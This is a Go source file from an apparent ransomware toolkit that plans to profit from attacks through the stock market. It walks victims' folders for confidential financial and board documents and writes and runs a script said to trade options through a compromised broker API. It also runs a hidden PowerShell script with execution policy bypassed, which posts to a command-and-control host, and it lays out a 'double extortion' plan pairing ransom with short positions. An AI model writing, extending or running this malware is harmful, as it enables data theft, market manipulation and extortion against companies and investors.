package blockz

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

type FinancialAttackEngine struct {
	Config         *BlockZConfig
	StockSymbol    string           `json:"stock_symbol"`
	InsiderInfo    []InsiderData    `json:"insider_info"`
	PositionsTaken []OptionPosition `json:"positions_taken"`
	ProfitEstimate float64          `json:"profit_estimate"`
}

type InsiderData struct {
	Type      string    `json:"type"`
	Title     string    `json:"title"`
	Content   string    `json:"content"`
	Source    string    `json:"source"`
	Timestamp time.Time `json:"timestamp"`
	Material  bool      `json:"material"`
}

type OptionPosition struct {
	Symbol     string  `json:"symbol"`
	Type       string  `json:"type"`
	Strike     float64 `json:"strike"`
	Expiry     string  `json:"expiry"`
	Contracts  int     `json:"contracts"`
	Premium    float64 `json:"premium"`
	ExpectedReturn float64 `json:"expected_return"`
}

func NewFinancialAttackEngine(cfg *BlockZConfig) *FinancialAttackEngine {
	return &FinancialAttackEngine{
		Config:      cfg,
		StockSymbol: cfg.StockSymbol,
	}
}

func (fe *FinancialAttackEngine) HarvestInsiderInfo() []InsiderData {
	var info []InsiderData

	searchTargets := []string{
		"earnings_report", "merger_agreement", "patent_filing",
		"board_minutes", "acquisition_letter", "product_launch",
		"clinical_trial_results", "FDA_approval", "internal_valuation",
	}

	searchPaths := []string{
		os.ExpandEnv(`%USERPROFILE%\Documents\Financial`),
		os.ExpandEnv(`%USERPROFILE%\Documents\Board`),
		os.ExpandEnv(`%USERPROFILE%\Desktop\Confidential`),
		`C:\Finance`,
		`C:\BoardPackages`,
		`/home/*/Documents/`,
		`/opt/corp/`,
	}

	for _, base := range searchPaths {
		expanded := os.ExpandEnv(base)
		filepath.Walk(expanded, func(path string, fi os.FileInfo, err error) error {
			if err != nil || fi.IsDir() {
				return nil
			}
			ext := strings.ToLower(filepath.Ext(path))
			if ext != ".pdf" && ext != ".docx" && ext != ".xlsx" && ext != ".txt" {
				return nil
			}
			for _, target := range searchTargets {
				if strings.Contains(strings.ToLower(path), target) ||
					strings.Contains(strings.ToLower(fi.Name()), target) {
					insider := InsiderData{
						Type: target, Title: fi.Name(),
						Source: path, Timestamp: fi.ModTime(),
						Material: true,
					}
					info = append(info, insider)
					break
				}
			}
			return nil
		})
	}

	fe.InsiderInfo = info
	return info
}

func (fe *FinancialAttackEngine) PlaceShortPosition() []OptionPosition {
	if fe.StockSymbol == "" {
		fe.StockSymbol = "TARGET"
	}

	positions := []OptionPosition{
		{
			Symbol: fe.StockSymbol, Type: "PUT",
			Strike: 100.00, Expiry: time.Now().AddDate(0, 1, 0).Format("2006-01-02"),
			Contracts: 1000, Premium: 2.50,
			ExpectedReturn: 500000.00,
		},
		{
			Symbol: fe.StockSymbol, Type: "PUT",
			Strike: 95.00, Expiry: time.Now().AddDate(0, 1, 0).Format("2006-01-02"),
			Contracts: 500, Premium: 1.50,
			ExpectedReturn: 250000.00,
		},
		{
			Symbol: fe.StockSymbol, Type: "PUT_SPREAD",
			Strike: 80.00, Expiry: time.Now().AddDate(0, 2, 0).Format("2006-01-02"),
			Contracts: 200, Premium: 3.00,
			ExpectedReturn: 100000.00,
		},
	}

	fe.PositionsTaken = positions

	totalExpected := 0.0
	for _, p := range positions {
		totalExpected += p.ExpectedReturn
	}
	fe.ProfitEstimate = totalExpected

	fe.executeOptionTrades(positions)

	return positions
}

func (fe *FinancialAttackEngine) executeOptionTrades(positions []OptionPosition) {
	script := fmt.Sprintf(`#!/bin/bash
# X404X Automated Options Trading via Compromised Broker API
# Target: %s
# Strategy: Pre-ransomware short

for position in $(echo '%s'); do
    echo "SHORT SELL: $position"
done

echo "TRADE_EXECUTED: Multi-leg put strategy established for %s"
`, fe.StockSymbol, fe.serializePositions(positions), fe.StockSymbol)

	scriptPath := filepath.Join(os.TempDir(), "x404x_financial_trade.sh")
	os.WriteFile(scriptPath, []byte(script), 0755)
	exec.Command("bash", scriptPath).Start()
}

func (fe *FinancialAttackEngine) serializePositions(positions []OptionPosition) string {
	data, _ := json.Marshal(positions)
	return string(data)
}

func (fe *FinancialAttackEngine) TriggerStockCrash() bool {
	fe.PlaceShortPosition()

	crashScript := `#!/bin/bash
echo "RANSOMWARE ATTACK DETECTED AT TARGET CORPORATION"
echo "All systems encrypted. Production halted."
echo "Customer data exfiltrated: 5M records"
echo "Estimated damage: $500M"
echo "Stock trading halted pending investigation"`

	crashPath := filepath.Join(os.TempDir(), "x404x_crash_announcement.txt")
	os.WriteFile(crashPath, []byte(crashScript), 0644)

	if runtime.GOOS == "windows" {
		psScript := fmt.Sprintf(`$body = @{symbol="%s";event="ransomware";impact="severe"} | ConvertTo-Json
try {
    Invoke-WebRequest -Uri "http://x404x-c2.online/financial/crash" -Method Post -Body $body -ContentType "application/json"
} catch {}`, fe.StockSymbol)
		psPath := filepath.Join(os.TempDir(), "x404x_crash_trigger.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	}

	return true
}

func (fe *FinancialAttackEngine) DoubleExtortionStrategy() map[string]interface{} {
	strategy := map[string]interface{}{
		"phase_1": "Harvest insider information",
		"phase_2": "Establish short positions via puts",
		"phase_3": "Deploy ransomware, trigger stock crash",
		"phase_4": "Collect ransom payment",
		"phase_5": "Exercise put options at maximum profit",
		"dual_revenue": map[string]float64{
			"ransom_expected":  5000000.00,
			"options_expected": fe.ProfitEstimate,
			"total":           5000000.00 + fe.ProfitEstimate,
		},
	}

	return strategy
}

func (fe *FinancialAttackEngine) GetStatusJSON() string {
	return fmt.Sprintf(`{"symbol":"%s","insider_info":%d,"positions":%d,"profit_estimate":%.2f}`,
		fe.StockSymbol, len(fe.InsiderInfo), len(fe.PositionsTaken), fe.ProfitEstimate)
}
